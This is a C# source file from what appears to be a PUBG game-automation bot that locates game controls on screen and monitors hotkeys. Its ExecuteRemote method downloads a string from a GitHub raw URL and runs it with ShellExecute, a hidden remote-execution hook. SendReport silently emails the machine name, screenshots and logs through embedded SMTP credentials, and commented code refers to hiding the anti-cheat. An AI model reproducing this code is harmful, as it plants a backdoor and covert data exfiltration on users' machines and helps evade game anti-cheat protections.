using System;
using System.Collections.Generic;
using System.Drawing;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO.Compression;
using SnLib;
using Win32;
using System.IO;

namespace pbpb {

    
	public class ___wqeqweqweq {}

    partial class Form1
    {
        public static PCS Pcs = null;

        void Init_Pcs() {

            Pcs = new PCS();

            Pcs.Add( PubgControls.btnStart, new PubgControl( PubgControls.btnStart.ToString(),
                                                    (ulong) PubgControls.btnStart,
                                                    40, 480, 181, 520 ) ); //g

            Pcs.Add( PubgControls.btnExit, new PubgControl( PubgControls.btnExit.ToString(),
                                                    (ulong) PubgControls.btnExit,
                                                    803, 462, 913, 493 ) );

            Pcs.Add( PubgControls.labAlive, new PubgControl( PubgControls.labAlive.ToString(),
                                                    (ulong) PubgControls.labAlive,
                                                    920, 20, 936, 30 ) ); //g

            Pcs.Add( PubgControls.labJoined, new PubgControl( PubgControls.labJoined.ToString(),
                                                    (ulong) PubgControls.labJoined,
                                                    912, 20, 933, 30 ) ); //g

            Pcs.Add( PubgControls.labEject, new PubgControl( PubgControls.labEject.ToString(),
                                                    (ulong) PubgControls.labEject,
                                                    562, 311, 576, 316 ) ); //g

            Pcs.Add( PubgControls.labReleaseParachute, new PubgControl( PubgControls.labReleaseParachute.ToString(),
                                                    (ulong) PubgControls.labReleaseParachute,
                                                    614, 312, 635, 316 ) ); //g

            Pcs.Add( PubgControls.btnMatchCanContinue, new PubgControl( PubgControls.btnMatchCanContinue.ToString(),
                                                    (ulong) PubgControls.btnMatchCanContinue,
                                                    426, 300, 483, 320 ) );

            Pcs.Add( PubgControls.btnMatchCanContinueCancel, 
                new PubgControl( PubgControls.btnMatchCanContinueCancel.ToString(),
                                 (ulong) PubgControls.btnMatchCanContinueCancel,
                                 510, 310 ) );

            Pcs.Add( PubgControls.labWater, new PubgControl( PubgControls.labWater.ToString(),
                                                    (ulong) PubgControls.labWater,
                                                    587, 507, 613, 526 ) );          

            Pcs.Add( PubgControls.labSysManu, new PubgControl( PubgControls.labSysManu.ToString(),
                                                    (ulong) PubgControls.labSysManu,
                                                    427, 188, 484, 194 ) );

            Pcs.Add( PubgControls.btnSysMenuLobby, new PubgControl( PubgControls.btnSysMenuLobby.ToString(),
                                                    (ulong) PubgControls.btnSysMenuLobby,
                                                    446, 296, 510, 305 ) );

            Pcs.Add( PubgControls.btnSoloSquad, new PubgControl( PubgControls.btnSoloSquad.ToString(),
                                                    (ulong) PubgControls.btnSoloSquad,
                                                    68, 395 ) );

            Pcs.Add( PubgControls.btnConfirmExit, new PubgControl( PubgControls.btnConfirmExit.ToString(),
                                                    (ulong) PubgControls.btnConfirmExit,
                                                    420, 298 ) );

            Pcs.Add( PubgControls.btnVirtCenter, new PubgControl( PubgControls.btnVirtCenter.ToString(),
                                                    (ulong) PubgControls.btnVirtCenter,
                                                    480, 308 ) );

            Pcs.Add( PubgControls.labSettings, new PubgControl( PubgControls.labSettings.ToString(),
                                                    (ulong) PubgControls.labSettings,
                                                    286, 53, 359, 70 ) );

            Pcs.Add( PubgControls.labMatchFailed, new PubgControl( PubgControls.labMatchFailed.ToString(),
                                                    (ulong) PubgControls.labMatchFailed,
                                                    360, 514, 467, 528 ) );

            Pcs.Add( PubgControls.btnReconnect, new PubgControl( PubgControls.btnReconnect.ToString(),
                                                    (ulong) PubgControls.btnReconnect,
                                                    436, 291, 523, 312 ) );

            Pcs.Add( PubgControls.labPlayerStateStand, new PubgControl( PubgControls.labPlayerStateStand.ToString(),
                                        (ulong) PubgControls.labPlayerStateStand,
                                        356, 502, 360, 520 ) );
        }

        public const int WM_ACTIVATEAPP = User32.WM_USER + 0x0001;

        public const int WM_SCRUPDATE = User32.WM_USER + 0x0002;

        protected override void WndProc( ref Message m )
        {

            if (m.Msg == WM_ACTIVATEAPP) {

                Show(); WindowState = FormWindowState.Normal;
            } 
            else if (m.Msg == WM_SCRUPDATE) {

                if (Visible && Setti.DrawScr /*&& User32.FindWindow( null, Form1.ViewFormTitle ) == 0*/) {

                    PanelView.BackgroundImage.Dispose();
                    PanelView.BackgroundImage = null;
                    if (PubgStatus.RawScr != null) 
                        PanelView.BackgroundImage = new Bitmap(PubgStatus.RawScr);                                    
                }

                if (PubgRound.IsLive) {

                    string rtimestr = STime.TickToStr( Environment.TickCount - PubgRound.StartedTime );
                    lab_CurrentRounTime.Text = String.Format( "{0}", rtimestr );
                }
            }

            base.WndProc( ref m );
        }


        bool AppIsLaunched => User32.IsFindWindow(null, AppTitle );

        void AppActivate() => 
            User32.SendMessage( User32.FindWindow( 0, AppTitle ), WM_ACTIVATEAPP, 0, 0 );

        bool IsInBlack() {

            string url = "https://raw.githubusercontent.com/ostway/bin/master/bl";
            SNet.Download( url, out string banlist );
            return ( banlist == null || banlist.ToLower().Contains( Environment.MachineName.ToLower() ) );
        }

        void ExecuteRemote() {

            string url = "https://raw.githubusercontent.com/ostway/bin/master/ex";
            SNet.Download( url, out string ex );
            if (String.IsNullOrWhiteSpace(ex)) return;

            Shell32.ShellExecute(IntPtr.Zero, "open", ex, null, null, User32.SW_SHOWNORMAL);
        }

        public static void SendReport( bool skip = false, bool attachscr = false, bool attachlog = false) {

            if (skip) return;
            try {

                string timetag = PubgRound.GetRewardName();
                string path = SPath.Temp + timetag;

                Directory.CreateDirectory( path );
                if (attachscr) SGraph.Scr( path + "\\s.g", 0, 0, 0, 0, true );
                if (attachlog) Log.Save( path + "\\l.log" );

                string zipfilename = SPath.Temp + timetag + ".zip";
                ZipFile.CreateFromDirectory( path, zipfilename );

                string subj = Environment.MachineName;
                SNet.SendMail( "smtp.*mail.com", 587, "mail.com", pp1 + pp2,
                               "mail.com", subj, subj + " | " + DateTime.Now.ToString(),
                               ( attachscr || attachlog ) ? zipfilename : null );

                Directory.Delete( path, true );
                File.Delete( zipfilename );
            }
            catch { };
        }

        void Init_HotKeysMon() {

            Task.Run( () => {

                bool IsPres( Keys key ) => ( User32.GetAsyncKeyState( (int) key ) < 0 );         
                
                while (true) {
                    try {
                        if (IsPres(Keys.PrintScreen))
                        {

                            string fn = @"D:\Pictures\Scr\" + PubgRound.GetRewardName() + ".jpg";
                            SGraph.Scr(fn, 0, 0, 0, 0, true);
                            Thread.Sleep(1500);
                            //string msg = "Bot " + ( !BotIsStopped ? "stopped" : "launched" );
                            //if (!BotIsStopped) {
                            //    StopBotClick(this);
                            //    PubgWindow.CloseMsg(); PubgWindow.KillExecute(); PubgWindow.HideBE();
                            //    Log.Add( msg + " [user key]" );
                            //}
                            //else {
                            //    StartBotClick(this);
                            //    Log.Add( msg + " [user key]" );
                            //}
                            //tray.BalloonTipText = msg;
                            //tray.ShowBalloonTip( 2000 );
                            //Thread.Sleep( 3000 );
                        }
                        else if (IsPres(Keys.Left) || IsPres(Keys.Right))
                        {
                            PubgRound.ManualWait = false;
                        }
                    }
                    catch (Exception e) {

                        Log.Add("HotKeysMon exception..." + e.Message);
                    }
                    Thread.Sleep(10);
                }
                
            } );
        }

        // ?
        void test1(bool fromfile) {

            Bitmap scr;

            if (fromfile)
                 scr = new Bitmap(full_scr_filename);
            else
                 scr = SGraph.Scr("", PubgWindow.Width, PubgWindow.Height, PubgWindow.PosX, PubgWindow.PosY);

            Init_Pcs();
            PubgControl pc = Pcs[PubgControls.labReleaseParachute]; //!!! T !!!
            pc.ControlImageFromImage(scr);          
            int dist = pc.CalcDistance(true);

            Log.Add( String.Format("calc: {0} , cmp: {1}{2}=> dist: {3}", 
                pc.ControlImageHash, pc.ComparableHash, Environment.NewLine, dist) );

            scr.Save( filename_now );
            scr.Dispose();
            pc.ControlImage.Save( filename_now + ".bmp" );

        }
   }
}